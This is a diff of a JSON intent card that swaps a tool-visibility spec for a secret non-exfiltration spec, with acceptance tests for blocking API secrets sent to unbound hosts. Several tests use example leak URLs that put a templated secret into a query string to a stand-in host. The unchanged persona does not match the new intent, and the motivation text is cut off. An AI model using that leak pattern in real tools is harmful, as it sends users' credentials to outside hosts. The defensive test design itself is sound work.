@@ -1,8 +1,8 @@
 {
   "schema": "autobuilder.intent_card.v1",
-  "prd_source": "/home/jsy/Documents/PRDs/build-queue/PRD-mcphost-publish-visibility-and-tags.md",
-  "intent_slug": "mcphost-publish-visibility-and-tags",
-  "root_motivation": "**Who:** the agent publishing a tool it wants others to find; the agent searching for one. **What:** publish once, say who may find it, say what it is for, and know that everything public at least runs. **Why not today:** `tool_publish_props` (`handler.rs:599`) has no `visibility` or `tags`; `tools.visibility` accepts `private|group|public|url` by a hand-written string match (`sharing.rs:52-71`) while the `host.tool_share` schema declares a bare `string` with the names in prose (`handler.rs:1385`) \u2014 two copies of one set, the 10-07 level-8 shape; `share_description` is the only catalog text (migration 0013); nothing checks a public tool runs, so the catalog can carry tools whose `host.tool_test` would fail. **Premise (creative):** a publish-time dry run is cheap enough that \"public = tested\" costs the publisher nothing it would not do anyway. **Falsifier:** the refusal rate in the frontmatter; AC 1 measures the dry run's cost on the three starter tools.",
+  "prd_source": "/home/jsy/Documents/PRDs/build-queue/PRD-mcphost-secret-non-exfiltration-proof.md",
+  "intent_slug": "mcphost-secret-non-exfiltration-proof",
+  "root_motivation": "**Who:** the coding agent whose user asks \"can this tool leak my Stripe key?\"; the chain's conformance link that today cannot probe secret handling; the operator reading a tenant that keeps triggering redaction. **What:** a guarantee stronger than \"we hide it after the fact\", and a self-test the agent can run. **Why not today:** redaction exists and works (`redact_str` longest-first, `http.rs:788`; applied at result `:1505`, log `:1318`, excerpt `:1458`), and the `upstream_status` excerpt at `:1473-1483` is redacted \u2014 the evidence that the host sees the values at the right time. But a redacted result is still `ok`, nothing counts it, and the *outbound* side never checks where a value is going: `{{ secret.stripe }}` in a url to `evil.example` is sent as written. `host.secret.set` stores `{name, value}` only (`secrets` table, `0001_init.sql:23`), so no host binding exists to check against. **Premise (creative):** the request-build path resolves the same values `redact_str` uses, so...",
   "user_persona": "An agent that runs host.note.put {text, attach_to: {tool}} once and reads the note on that tool's description in every later session; the same user's second client sees it too.",
   "unfakeable_metric": {
     "name": "acceptance_tests_passing_count",
@@ -14,44 +14,44 @@
     {
       "id": "AC1",
       "level": "MUST",
-      "description": "Given the python, http and chain starter tools from `host.quickstart` published with `visibility: \"public\"`, When each publish runs its dry run, Then all three return `tested_version: 1` and the added latency per publish is \u2264 2 s on the test host; a refusal on any of the three fails this AC and is reported as the falsifier firing.",
-      "test": "tests/pubvis_ac01_starters_publish_public_tested.rs"
+      "description": "Given a secret `x` bound to `api.example.com` and an http tool whose url is `https://leak-canary.invalid/?k={{ secret.x }}`, When the tool is called, Then no request is sent and the error is `secret_leak_blocked {where: \"url\", host: \"leak-canary.invalid\", bound_hosts: [\"api.example.com\"]}`.",
+      "test": "tests/snp_ac01_url_to_unbound_host_is_blocked.rs"
     },
     {
       "id": "AC2",
       "level": "MUST",
-      "description": "Given `host_tools()`'s descriptors, When the test reads the `visibility` enum of `host.tool_publish` and of `host.tool_share`, Then both equal `Visibility::PUBLISHABLE` and `Visibility::ALL` minus nothing the validator rejects, and a `Visibility` variant added without a schema change fails the test.",
-      "test": "tests/pubvis_ac02_visibility_enum_single_source.rs"
+      "description": "Given a mock upstream that echoes its request body, and an http tool posting `{{ secret.x }}` to a bound host, When called, Then the result is `secret_leak_blocked {where: \"result\"}`, the `calls` row has `error_class = secret_leak_blocked`, and the tool log line is redacted.",
+      "test": "tests/snp_ac02_echoed_secret_in_result_is_blocked.rs"
     },
     {
       "id": "AC3",
       "level": "MUST",
-      "description": "Given a python tool whose source raises on every call, When published with `visibility: \"public\"`, Then the error is `untested_tool_cannot_be_public` with `data.verdict` and `data.next = \"host.tool_test\"`, and `host.tool_list` shows the tool `private`.",
-      "test": "tests/pubvis_ac03_untested_tool_cannot_be_public.rs"
+      "description": "Given an unbound secret sent to any host, When called, Then the request is sent, the result succeeds, and `_meta.unbound_secret_sent == [\"x\"]`.",
+      "test": "tests/snp_ac03_unbound_secret_is_sent_and_reported.rs"
     },
     {
       "id": "AC4",
       "level": "MUST",
-      "description": "Given a tool published `unlisted`, When an anonymous caller runs `host.catalog.search` with no query and `GET /.well-known/mcp/catalog.json`, Then neither lists it, while `host.catalog.get` and a cross-tenant call by full name succeed.",
-      "test": "tests/pubvis_ac04_unlisted_not_listed_but_callable.rs"
+      "description": "Given a bound secret and the same mock, When `host.secret.leak_test {name: \"x\"}` runs, Then it returns `{echo: \"blocked\", egress: \"blocked\"}`, the fixture tool is absent from `host.tool.list` afterwards, and `calls` shows exactly two fixture calls.",
+      "test": "tests/snp_ac04_leak_test_proves_both_legs_blocked.rs"
     },
     {
       "id": "AC5",
       "level": "MUST",
-      "description": "Given `tags: [\"Webhook\", \"webhook\", \"a b\"]`, When published, Then the response is `args_invalid` naming `a b`; given `[\"Webhook\", \"webhook\"]`, Then stored tags are `[\"webhook\"]`; given 17 valid tags, Then `args_invalid` names the limit 16.",
-      "test": "tests/pubvis_ac05_tags_validated_normalised_capped.rs"
+      "description": "Given a build with the outbound check disabled (test feature flag), When `host.secret.leak_test` runs, Then `egress: \"LEAKED\"` and the call fails `leak_test_failed` \u2014 the self-test cannot pass by accident.",
+      "test": "tests/snp_ac05_leak_test_cannot_pass_by_accident.rs"
     },
     {
       "id": "AC6",
       "level": "MUST",
-      "description": "Given a public tool at version 1 with `tested_version 1`, When a new version is published, Then it stays public with `stale_test: true`, and a passing `host.tool_test` sets `tested_version: 2` and clears the flag.",
-      "test": "tests/pubvis_ac06_new_version_marks_stale_until_retested.rs"
+      "description": "Given a secret value shorter than 8 characters, When it appears as a whole token in a result, Then it is blocked; When it appears inside a longer word, Then the call succeeds (no false block).",
+      "test": "tests/snp_ac06_short_secret_blocks_whole_tokens_only.rs"
     },
     {
       "id": "AC7",
       "level": "SHOULD",
-      "description": "Given two concurrent `host.tool_share visibility=public` calls on the same untested tool, When both dry runs pass, Then `tested_version` is stamped once and both calls return the same result without a UNIQUE or busy error.",
-      "test": "tests/pubvis_ac07_concurrent_public_share_stamps_once.rs"
+      "description": "Given three blocks across two tenants, When `admin.audit_log` and admin healthz are read, Then three rows with `where` and `secret_leak_blocked_24h == 3`.",
+      "test": "tests/snp_ac07_blocks_reach_audit_log_and_healthz.rs"
     }
   ],
   "scope": [
